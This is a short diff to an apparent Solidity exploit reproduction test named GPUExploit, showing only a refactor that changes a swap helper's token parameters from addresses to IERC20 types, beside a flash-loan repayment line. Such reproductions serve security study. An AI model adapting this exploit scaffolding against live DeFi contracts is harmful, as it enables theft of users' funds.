@@ -59,9 +59,9 @@ contract GPUExploit is Test {
         busd.transfer(address(busdWbnbPair), amount0 + feeAmount);
     }
 
-    function _swap(uint256 amountIn, address tokenA, address tokenB) private {
+    function _swap(uint256 amountIn, IERC20 tokenA, IERC20 tokenB) private {
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amountIn, 0, getPath(tokenA, tokenB), address(this), block.timestamp
+            amountIn, 0, getPath(address(tokenA), address(tokenB)), address(this), block.timestamp
         );
     }
 
